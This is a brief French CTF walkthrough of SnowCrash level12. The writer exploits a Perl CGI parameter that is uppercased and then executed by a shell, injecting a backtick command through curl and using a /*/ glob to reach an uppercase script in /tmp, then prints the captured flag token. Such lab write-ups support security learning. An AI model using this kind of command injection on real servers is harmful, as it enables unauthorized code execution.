ls -la
level12.pl
quand on le cat on voit qu'il prend un param x et y
on peut voir que dans le code on a juste besoin d'arriver a @output qui va nous permettre de faire notre getflag
on vois que le output utilise la variable xx qui est le param x
donc on doit jouer avec x
on voit que x et mis en maj
et apres on voit que si on a * il va nous chercher ce qu'il correspont comme quand on fait git add *.c

donc avec ca on doit lui faire lancer un fichier /tmp/script
qui contient:
getflag > /tmp/result

on va try
level12@SnowCrash:~$ echo "getflag > /tmp/result2" > /tmp/script2
level12@SnowCrash:~$ cat /tmp/script2
getflag > /tmp/result2
level12@SnowCrash:~$ chmod 777 /tmp/script2

ok ensuite faut le lancer

level12@SnowCrash:~$ curl 'localhost:4646?x=`/tmp/script2`'
..level12@SnowCrash:~$ cat /tmp/result2

j'avait oublier qu'il passer tout en maj
mais si on met tmp en maj ca ne marche plus donc a va utiliser le *

echo "getflag > /tmp/result2" > /tmp/SCRIPT2

on va re try
level12@SnowCrash:~$ curl 'localhost:4646?x=`/*/SCRIPT2`'
level12@SnowCrash:~$ cat /tmp/result2
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
LET'S GO 